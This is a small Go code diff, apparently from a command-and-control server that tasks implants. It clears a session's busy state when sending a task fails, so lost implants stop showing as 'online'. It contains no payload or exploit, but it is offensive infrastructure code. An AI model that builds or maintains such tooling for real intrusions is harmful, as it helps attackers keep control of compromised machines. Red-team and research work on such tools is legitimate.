@@ -1047,6 +1047,11 @@ func (l *TCPListener) PushTask(sessionID string, taskInfo *types.TaskInfo) error
 	}
 	if err := l.queuePacket(sessionID, packet, true); err != nil {
 		l.sessionMgr.ClearConnection(sessionID)
+		// 下发失败 == 任务根本没到植入端，必须一并清掉 Create() 时设下的忙期。
+		// 否则操作员每点一次命令，就给一个已失联的会话续一次 2×心跳超时 的忙期，
+		// 判活窗口被放宽 BusyGrace 倍 —— 界面一直显示"在线"，
+		// 而实际每条命令都是 no writer。实测正是这条路径把 6 分钟的假在线拖了出来。
+		l.sessionMgr.ClearSessionBusy(sessionID)
 		return fmt.Errorf("failed to send task: %w", err)
 	}
 	now := time.Now()
